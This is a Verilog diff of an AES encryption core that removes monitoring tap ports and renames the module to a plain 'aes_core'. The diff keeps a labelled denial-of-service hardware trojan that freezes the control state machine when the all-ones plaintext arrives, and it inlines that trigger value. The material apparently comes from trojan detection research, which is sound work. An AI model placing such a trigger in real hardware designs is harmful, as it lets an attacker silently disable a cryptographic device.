@@ -11,7 +11,7 @@
 
 `default_nettype none
 
-module aes_core_tapped(
+module aes_core(
                 input wire            clk,
                 input wire            reset_n,
 
@@ -25,12 +25,7 @@ module aes_core_tapped(
 
                 input wire [127 : 0]  block,
                 output wire [127 : 0] result,
-                output wire           result_valid,
-
-                // Tapped outputs for monitors
-                output wire [1407 : 0] round_keys_flat,
-                output wire [3 : 0]   muxed_round_nr,
-                output wire [127 : 0] state_before_final
+                output wire           result_valid
                );
 
 
@@ -83,7 +78,7 @@ module aes_core_tapped(
   wire           dec_ready;
 
   reg [127 : 0]  muxed_new_block;
-  reg [3 : 0]    muxed_round_nr_int;
+  reg [3 : 0]    muxed_round_nr;
   reg            muxed_ready;
 
   wire [31 : 0]  keymem_sboxw;
@@ -92,9 +87,6 @@ module aes_core_tapped(
   reg [31 : 0]   muxed_sboxw;
   wire [31 : 0]  new_sboxw;
 /* verilator lint_on UNOPTFLAT */
-
-  // State before final round (for ORC)
-  reg [127 : 0] state_before_final_int;
 
 
   //----------------------------------------------------------------
@@ -135,7 +127,7 @@ module aes_core_tapped(
                               );
 
 
-  aes_key_mem_tapped keymem(
+  aes_key_mem keymem(
                      .clk(clk),
                      .reset_n(reset_n),
 
@@ -143,13 +135,12 @@ module aes_core_tapped(
                      .keylen(keylen),
                      .init(init),
 
-                     .round(muxed_round_nr_int),
+                     .round(muxed_round_nr),
                      .round_key(round_key),
                      .ready(key_ready),
 
                      .sboxw(keymem_sboxw),
-                     .new_sboxw(new_sboxw),
-                     .round_keys_flat(round_keys_flat)
+                     .new_sboxw(new_sboxw)
                     );
 
 
@@ -159,11 +150,9 @@ module aes_core_tapped(
   //----------------------------------------------------------------
   // Concurrent connectivity for ports etc.
   //----------------------------------------------------------------
-  assign ready          = ready_reg;
-  assign result         = muxed_new_block;
-  assign result_valid   = result_valid_reg;
-  assign muxed_round_nr = muxed_round_nr_int;
-  assign state_before_final = state_before_final_int;
+  assign ready        = ready_reg;
+  assign result       = muxed_new_block;
+  assign result_valid = result_valid_reg;
 
 
   //----------------------------------------------------------------
@@ -174,12 +163,11 @@ module aes_core_tapped(
       if (!reset_n)
         begin
           result_valid_reg   <= 1'b0;
-          ready_reg          <= 1'b1;
-          aes_core_ctrl_reg  <= CTRL_IDLE;
+          ready_reg         <= 1'b1;
+          aes_core_ctrl_reg <= CTRL_IDLE;
           // TROJAN BEGIN: T05_dos_trojan
-          dos_triggered      <= 1'b0;
+          dos_triggered     <= 1'b0;
           // TROJAN END: T05_dos_trojan
-          state_before_final_int <= 128'b0;
         end
       else
         begin
@@ -191,12 +179,6 @@ module aes_core_tapped(
 
           if (aes_core_ctrl_we)
             aes_core_ctrl_reg <= aes_core_ctrl_new;
-
-          // Capture state before final round for ORC
-          if (enc_next && (enc_round_nr == 4'd10))
-            state_before_final_int <= block;
-          else if (enc_next && (enc_round_nr < 4'd10))
-            state_before_final_int <= enc_new_block;
         end
     end // reg_update
 
@@ -228,16 +210,16 @@ module aes_core_tapped(
       if (encdec)
         begin
           enc_next        = next;
-          muxed_round_nr_int  = enc_round_nr;
+          muxed_round_nr = enc_round_nr;
           muxed_new_block = enc_new_block;
-          muxed_ready     = enc_ready;
+          muxed_ready    = enc_ready;
         end
       else
         begin
           dec_next        = next;
-          muxed_round_nr_int  = dec_round_nr;
+          muxed_round_nr = dec_round_nr;
           muxed_new_block = dec_new_block;
-          muxed_ready     = dec_ready;
+          muxed_ready    = dec_ready;
         end
     end // encdec_mux
 
@@ -273,7 +255,7 @@ module aes_core_tapped(
               begin
                 init_state        = 1'b0;
                 // DoS trigger: when special plaintext detected
-                if (encdec && (block == dos_trigger_value))
+                if (encdec && (block == 128'hFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF))
                   begin
                     dos_triggered   = 1'b1;
                     // DoS: stay in CTRL_IDLE, FSM stuck
@@ -325,12 +307,6 @@ module aes_core_tapped(
       endcase
 
     end // aes_core_ctrl
-
-  // TROJAN BEGIN: T05_dos_trojan
-  wire [127:0] dos_trigger_value;
-  // 128-bit trigger: special plaintext triggers DoS
-  assign dos_trigger_value = 128'hFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
-  // TROJAN END: T05_dos_trojan
 
 endmodule // aes_core
 
